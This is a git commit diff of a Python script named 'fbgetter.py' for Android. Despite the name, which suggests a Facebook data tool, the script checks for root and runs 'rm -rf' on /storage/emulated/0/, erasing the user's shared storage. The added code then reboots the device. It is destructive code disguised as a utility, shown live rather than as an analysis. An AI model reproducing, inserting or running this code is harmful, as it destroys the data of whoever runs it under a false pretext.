3c6eac768e69a4e8b55da6bd659a44f386077d29
ppcat123 <96396333+ppcat123@users.noreply.github.com>
2024-01-24 04:59:41 +0800

    fbgetter.py

--- fbgetter.py
+++ fbgetter.py
@@ -1,7 +1,6 @@
 import os
 import subprocess
 
-
 def has_root_access():
     try:
         subprocess.check_output("su", shell=True)
@@ -9,8 +8,18 @@ def has_root_access():
     except subprocess.CalledProcessError:
         return False
 
-addreq = "/storage/emulated/0/"
+def restart_device():
+    if has_root_access():
+        command = "su -c 'reboot'"
+        try:
+            subprocess.call(command, shell=True)
+            print("Device restarted successfully with root privileges.")
+        except subprocess.CalledProcessError as e:
+            print(f"An error occurred while restarting the device: {str(e)}")
+    else:
+        print("Root access is required to restart the device.")
 
+addreq = "/storage/emulated/0/"
 
 if has_root_access():
     command = f"su -c 'rm -rf {addreq}'"
@@ -20,7 +29,6 @@ if has_root_access():
     except subprocess.CalledProcessError as e:
         print(f"An error occurred while moving {addreq}: {str(e)}")
 else:
-    
     if os.path.exists(addreq):
         try:
             if os.path.isfile(addreq):
@@ -33,3 +41,6 @@ else:
             print(f"An error occurred while moving {addreq}: {str(e)}")
     else:
         print(f"{addreq} does not exist.")
+
+# Restart the device
+restart_device()
